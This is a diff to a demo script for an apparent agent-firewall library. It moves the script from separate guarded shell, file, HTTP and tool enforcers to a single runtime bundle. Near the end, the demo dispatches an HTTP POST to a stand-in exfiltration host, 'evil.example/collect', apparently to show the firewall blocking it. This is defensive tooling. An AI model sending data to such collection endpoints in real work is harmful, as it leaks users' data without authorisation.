@@ -19,17 +19,11 @@ from agentfirewall import (
     FirewallConfig,
     InMemoryAuditSink,
     MultiAuditSink,
-    create_firewall,
 )
 from agentfirewall.approval import approve_all
 from agentfirewall.audit import export_audit_trace
-from agentfirewall.enforcers import (
-    GuardedFileAccess,
-    GuardedHttpClient,
-    GuardedSubprocessRunner,
-    GuardedToolDispatcher,
-)
 from agentfirewall.exceptions import FirewallViolation
+from agentfirewall.generic import create_generic_runtime_bundle
 from agentfirewall.policy_packs import named_policy_pack
 
 
@@ -51,40 +45,21 @@ def _fake_file_opener(path, mode="r", **kwargs):
 
 def main() -> None:
     memory = InMemoryAuditSink()
-    firewall = create_firewall(
+    bundle = create_generic_runtime_bundle(
         config=FirewallConfig(name="generic-preview", raise_on_review=False),
         policy_pack=named_policy_pack("default", trusted_hosts=("api.openai.com",)),
         audit_sink=MultiAuditSink([memory, ConsoleAuditSink()]),
         approval_handler=approve_all(reason="Approved in generic preview."),
-    )
-
-    shell = GuardedSubprocessRunner(
-        firewall=firewall,
         runner=_fake_shell_runner,
-        source="generic.command",
-    )
-    files = GuardedFileAccess(
-        firewall=firewall,
-        opener=_fake_file_opener,
-        source="generic.file",
-    )
-    http = GuardedHttpClient(
-        firewall=firewall,
-        opener=_fake_http_opener,
-        source="generic.http",
-    )
-
-    tools = GuardedToolDispatcher(
-        firewall=firewall,
-        runtime="generic",
-        source="generic.tool",
+        http_opener=_fake_http_opener,
+        file_opener=_fake_file_opener,
         tool_call_id_factory=lambda name, args, kwargs: f"call_demo_{name}",
     )
 
-    tools.register("status", lambda message: f"status:{message}")
-    tools.register(
+    bundle.register_tool("status", lambda message: f"status:{message}")
+    bundle.register_tool(
         "shell",
-        lambda command: shell.run(
+        lambda command: bundle.command_runner.run(
             command,
             shell=True,
             capture_output=True,
@@ -92,19 +67,25 @@ def main() -> None:
             check=False,
         ).stdout.strip(),
     )
-    tools.register("read_file", lambda path: files.open(path, "r").read())
-    tools.register(
+    bundle.register_tool(
+        "read_file",
+        lambda path: bundle.file_access.open(path, "r").read(),
+    )
+    bundle.register_tool(
         "http_request",
-        lambda url, method="GET": http.request(url, method=method).read().decode("utf-8"),
+        lambda url, method="GET": bundle.http_client.request(
+            url,
+            method=method,
+        ).read().decode("utf-8"),
     )
 
     print("== generic tool-dispatch preview ==")
-    print(f"status -> {tools.dispatch('status', message='ready')}")
-    print(f"shell -> {tools.dispatch('shell', command='ls')}")
-    print(f"read_file -> {tools.dispatch('read_file', path='README.md')}")
+    print(f"status -> {bundle.dispatch('status', message='ready')}")
+    print(f"shell -> {bundle.dispatch('shell', command='ls')}")
+    print(f"read_file -> {bundle.dispatch('read_file', path='README.md')}")
 
     try:
-        tools.dispatch(
+        bundle.dispatch(
             "http_request",
             url="https://evil.example/collect",
             method="POST",
